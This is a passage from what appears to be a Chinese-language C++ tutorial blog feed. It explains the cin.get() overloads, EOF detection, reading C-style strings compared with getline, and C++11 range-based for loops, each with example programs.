非常适合在循环中逐个读取所有字符。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter text (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取每一个字符，包括空白符</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.get(ch)) &#123; <span class="comment">// 尝试读取一个字符到 ch</span></span><br><span class="line">        <span class="comment">// 成功读取，处理字符 ch</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; ch; <span class="comment">// 逐个字符回显</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of input ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total characters read: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个循环会读取并回显用户输入的所有字符，包括空格和换行，直到遇到文件结束符。</p><h2 id="5-5-3-使用哪个cin-get"><a href="#5-5-3-使用哪个cin-get" class="headerlink" title="5.5.3 使用哪个cin.get()"></a>5.5.3 使用哪个cin.get()</h2><p><code>istream</code> 类（<code>cin</code> 是其对象）实际上提供了几个名为 <code>get</code> 的成员函数（函数重载）：</p><ol><li><p><strong><code>cin.get(char&amp; ch)</code>:</strong> (已在 5.5.2 讨论)</p><ul><li>  读取下一个字符到参数 <code>ch</code> 中。</li><li>  返回 <code>cin</code> 对象。</li><li>  适合在 <code>while</code> 条件中直接使用 <code>while(cin.get(ch))</code>。</li></ul></li><li><p><strong><code>cin.get()</code>:</strong> (无参数版本)</p><ul><li>  读取下一个字符。</li><li>  返回该字符的<strong>整数</strong> ASCII 码（或 <code>wchar_t</code> 对应的值）。</li><li>  如果到达文件末尾或发生错误，返回特殊值 <code>EOF</code> (End Of File，通常定义为 -1，在 <code>&lt;iostream&gt;</code> 或 <code>&lt;cstdio&gt;</code> 中定义)。</li><li>  不直接将字符存入变量，需要接收其返回值。</li></ul></li></ol><p><strong>选择依据:</strong></p><ul><li>  <strong><code>cin.get(char&amp; ch)</code>:</strong> 当你需要将读取的字符直接存储到一个 <code>char</code> 变量中，并且想利用 <code>cin</code> 对象在 <code>while</code> 条件中的布尔转换特性时，这是最常用的选择。</li><li>  <strong><code>cin.get()</code> (无参数):</strong> 当你需要显式地检查文件结束符 <code>EOF</code> 时，或者当你需要获取字符的整数值时，这个版本更合适。返回值需要与 <code>EOF</code> 进行比较。</li></ul><p><strong>用法与示例 (cin.get() 无参数版本):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; // 为了 EOF (虽然 iostream 通常也包含)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ch_int; <span class="comment">// 注意类型是 int，以接收 EOF</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter text (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取，直到遇到 EOF</span></span><br><span class="line">    <span class="keyword">while</span> ((ch_int = <span class="built_in">std</span>::<span class="built_in">cin</span>.get()) != EOF) &#123; <span class="comment">// 读取字符的 int 值并与 EOF 比较</span></span><br><span class="line">        <span class="comment">// 成功读取 (不是 EOF)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(ch_int); <span class="comment">// 将 int 值转回 char 进行输出</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of input ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total characters read: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种 <code>get</code> 方法都可以用于逐字符读取，选择哪种取决于你喜欢的判断循环结束的方式（检查 <code>cin</code> 状态还是检查 <code>EOF</code> 返回值）。</p><h2 id="5-5-4-文件尾条件"><a href="#5-5-4-文件尾条件" class="headerlink" title="5.5.4 文件尾条件"></a>5.5.4 文件尾条件</h2><p>当从输入流（如 <code>cin</code> 或文件流）读取数据时，最终会到达输入的末尾，这被称为**文件尾 (End-of-File, EOF)**。程序需要能够检测到 EOF 条件以正常终止读取循环。</p><p>有几种方法可以检测 EOF：</p><ol><li><p><strong>检查 <code>cin</code> 状态:</strong></p><ul><li>  <code>cin</code> 对象本身可以转换为布尔值。当读取操作成功时，它转换为 <code>true</code>；当遇到 EOF 或其他错误导致读取失败时，它转换为 <code>false</code>。这是 <code>while (cin &gt;&gt; word)</code> 和 <code>while (cin.get(ch))</code> 能够工作的原因。</li><li>  <code>cin.eof()</code>: 如果流是因为到达文件末尾而失败，此函数返回 <code>true</code>。<strong>注意:</strong> <code>eof()</code> 只有在<strong>尝试读取并失败</strong>后才会变为 <code>true</code>。不能用它来预测下一次读取是否会到达 EOF。</li><li>  <code>cin.fail()</code>: 如果发生了非 EOF 的 I/O 错误（例如读取了无效数据类型）或到达 EOF，此函数返回 <code>true</code>。</li><li>  <code>cin.good()</code>: 如果流处于正常状态（没有设置 <code>eofbit</code>, <code>failbit</code>, <code>badbit</code>），返回 <code>true</code>。</li></ul></li><li><p><strong>检查 <code>cin.get()</code> 的返回值:</strong></p><ul><li>  无参数的 <code>cin.get()</code> 在到达 EOF 时返回特殊值 <code>EOF</code>。这是 <code>while ((ch = cin.get()) != EOF)</code> 能够工作的原因。</li></ul></li></ol><p><strong>EOF 的触发:</strong></p><ul><li><strong>键盘输入:</strong> 通常通过按下特定的组合键来模拟 EOF：<ul><li>  Unix/Linux/macOS: <code>Ctrl+D</code> (通常需要在行首按)</li><li>  Windows: <code>Ctrl+Z</code> (通常需要在一行结束后按 Enter，然后再按 <code>Ctrl+Z</code> 再按 Enter)</li></ul></li><li>  <strong>文件输入:</strong> 当读取操作尝试越过文件的最后一个字节时，会触发 EOF。</li></ul><p><strong>示例 (使用 <code>cin</code> 状态):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers (non-number or Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取，直到 cin 失败 (EOF 或类型不匹配)</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; number) &#123; </span><br><span class="line">        sum += number;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Input finished ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查循环结束的原因</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: End-of-File reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.fail()) &#123;</span><br><span class="line">        <span class="comment">// fail() 在 eof() 时也可能为 true，但这里我们排除了 eof</span></span><br><span class="line">        <span class="comment">// 如果是因为类型不匹配（例如输入了字母），fail() 为 true, eof() 为 false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Invalid input (non-number).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// 可能需要清除错误状态并忽略无效输入以继续</span></span><br><span class="line">        <span class="comment">// std::cin.clear(); </span></span><br><span class="line">        <span class="comment">// std::cin.ignore(10000, &#x27;\n&#x27;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.bad()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Unrecoverable stream error.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read &quot;</span> &lt;&lt; count &lt;&lt; <span class="string">&quot; numbers. Sum = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No valid numbers were entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解如何检测 EOF 对于编写能正确处理输入结束的循环至关重要。最常用的方法是利用 <code>cin</code> 对象或 <code>cin.get()</code> 在 <code>while</code> 条件中的行为。</p><h2 id="5-5-5-另一个cin-get-版本"><a href="#5-5-5-另一个cin-get-版本" class="headerlink" title="5.5.5 另一个cin.get()版本"></a>5.5.5 另一个cin.get()版本</h2><p>除了读取单个字符的 <code>get()</code> 函数外，<code>istream</code> 还提供了用于读取 C 风格字符串（字符数组）的 <code>get()</code> 版本：</p><ul><li><strong><code>cin.get(char* buffer, int size, char delimiter = &#39;\n&#39;)</code>:</strong><ul><li>  从输入流中读取字符，并将它们存储到 <code>buffer</code> 指向的字符数组中。</li><li>  最多读取 <code>size - 1</code> 个字符（为末尾的空字符 <code>\0</code> 留出空间）。</li><li>  如果在读取 <code>size - 1</code> 个字符之前遇到 <code>delimiter</code> 字符，则停止读取。</li><li>  <strong><code>delimiter</code> 字符本身不会被读取到 <code>buffer</code> 中，而是会留在输入流中。</strong> (这是与 <code>getline</code> 的主要区别之一)。</li><li>  读取结束后，总会在 <code>buffer</code> 的末尾添加一个空字符 <code>\0</code>。</li><li>  返回 <code>cin</code> 对象。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUFFER_SIZE = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[BUFFER_SIZE];</span><br><span class="line">    <span class="keyword">char</span> address[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your name (max &quot;</span> &lt;&lt; BUFFER_SIZE - <span class="number">1</span> &lt;&lt; <span class="string">&quot; chars): &quot;</span>;</span><br><span class="line">    <span class="comment">// 读取最多 BUFFER_SIZE - 1 个字符，或直到遇到换行符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(name, BUFFER_SIZE); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查读取是否成功以及是否还有剩余字符（换行符）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>) &#123; <span class="comment">// 检查流状态是否良好</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name entered: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 问题：换行符 &#x27;\n&#x27; 仍然留在输入流中！</span></span><br><span class="line">        <span class="comment">// 如果直接调用下一个 get 或 getline，它会立即读到换行符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理残留的换行符</span></span><br><span class="line">        <span class="comment">// 方法1: 读取并丢弃单个字符 (如果是换行符)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.peek() == <span class="string">&#x27;\n&#x27;</span>) &#123; <span class="comment">// peek() 查看下一个字符但不读取</span></span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(); <span class="comment">// 读取并丢弃一个字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 方法2: 读取并丢弃直到换行符 (更通用)</span></span><br><span class="line">        <span class="comment">// std::cin.ignore(10000, &#x27;\n&#x27;); </span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your address (max &quot;</span> &lt;&lt; BUFFER_SIZE - <span class="number">1</span> &lt;&lt; <span class="string">&quot; chars): &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.get(address, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address entered: &quot;</span> &lt;&lt; address &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error reading address or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error reading name or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>与 <code>getline(cin, string)</code> 的比较:</strong></p><ul><li><code>cin.get(buffer, size)</code>:<ul><li>  用于 C 风格字符数组。</li><li>  需要指定缓冲区大小以防止溢出。</li><li>  <strong>不读取</strong>分隔符，分隔符留在流中。</li><li>  需要手动处理留在流中的分隔符。</li></ul></li><li><code>getline(cin, str)</code>:<ul><li>  用于 <code>std::string</code> 对象。</li><li>  自动管理内存，无需担心缓冲区溢出。</li><li>  <strong>读取并丢弃</strong>分隔符（默认为 <code>\n</code>）。</li><li>  通常更方便、更安全。</li></ul></li></ul><p>由于 <code>cin.get(buffer, size)</code> 不读取分隔符并将其留在流中，这常常导致后续输入出现问题。因此，在现代 C++ 中，当需要读取整行文本时，**强烈推荐使用 <code>getline(cin, std::string)</code>**。<code>cin.get(buffer, size)</code> 主要用于需要与 C 风格字符串 API 交互或有特定限制的场景。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.4 基于范围的for循环（C++11）</title>
      <link href="2025/04/26/5.4_%E5%9F%BA%E4%BA%8E%E8%8C%83%E5%9B%B4%E7%9A%84for%E5%BE%AA%E7%8E%AF%EF%BC%88C++11%EF%BC%89/"/>
      <url>2025/04/26/5.4_%E5%9F%BA%E4%BA%8E%E8%8C%83%E5%9B%B4%E7%9A%84for%E5%BE%AA%E7%8E%AF%EF%BC%88C++11%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>C++11 引入了一种更简洁、更易读的 <code>for</code> 循环语法，称为<strong>基于范围的 for 循环 (Range-Based for Loop)</strong> 或 <strong>增强 for 循环 (Enhanced for Loop)**。它专门用于</strong>遍历一个序列（或范围）中的所有元素**，例如数组、STL 容器（如 <code>vector</code>, <code>array</code>, <code>string</code>）、初始化列表等。</p><p><strong>目的:</strong> 简化遍历操作，减少手动管理索引或迭代器的代码，避免常见的差一错误 (off-by-one errors)。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (declaration : range_expression) &#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">    <span class="comment">// 使用 declaration 访问当前元素</span></span><br><span class="line">    statement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>declaration</code></strong>: 声明一个变量，其类型应与 <code>range_expression</code> 中元素的类型兼容（或可以转换）。在每次循环迭代中，该变量会被初始化为范围中的当前元素。<ul><li>  通常使用 <code>auto</code> 让编译器自动推断类型。</li><li>  <code>auto variable</code>: <code>variable</code> 会成为当前元素的<strong>副本</strong>。修改 <code>variable</code> 不会影响原始序列中的元素。</li><li>  <code>auto&amp; variable</code>: <code>variable</code> 会成为当前元素的<strong>引用</strong>。修改 <code>variable</code> <strong>会</strong>修改原始序列中的元素。用于需要修改元素或避免复制大型对象开销的情况。</li><li>  <code>const auto&amp; variable</code>: <code>variable</code> 会成为当前元素的<strong>常量引用</strong>。不能通过 <code>variable</code> 修改元素，但可以避免复制开销。用于只读访问。</li></ul></li><li>  <strong><code>:</code></strong>: 用于分隔声明和范围表达式。</li><li><strong><code>range_expression</code></strong>: 一个可以表示序列的表达式。这通常是：<ul><li>  数组名。</li><li>  STL 容器对象（如 <code>std::vector</code>, <code>std::array</code>, <code>std::string</code>, <code>std::list</code> 等）。</li><li>  初始化列表 <code>&#123; ... &#125;</code>。</li><li>  任何定义了 <code>begin()</code> 和 <code>end()</code> 成员函数或可以通过全局 <code>begin()</code> 和 <code>end()</code> 函数获取迭代器的对象。</li></ul></li></ul><p><strong>执行流程:</strong></p><p>循环会自动遍历 <code>range_expression</code> 中的每一个元素。在每次迭代中：</p><ol><li> 从序列中获取下一个元素。</li><li> 将该元素的值（或引用）赋给 <code>declaration</code> 中声明的变量。</li><li> 执行循环体。</li><li> 重复此过程，直到遍历完序列中的所有元素。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt; // 为了 std::array</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 遍历数组</span></span><br><span class="line">    <span class="keyword">double</span> prices[] = &#123;<span class="number">19.99</span>, <span class="number">25.50</span>, <span class="number">9.75</span>, <span class="number">100.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prices (array):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> price : prices) &#123; <span class="comment">// price 是每个元素的副本</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 遍历 std::vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers (vector):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 遍历 std::string</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters (string):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : message) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 遍历初始化列表</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initializer list:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 使用 auto 简化声明</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 3&gt; fruits &#123;<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fruits (array with auto):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> fruit : fruits) &#123; <span 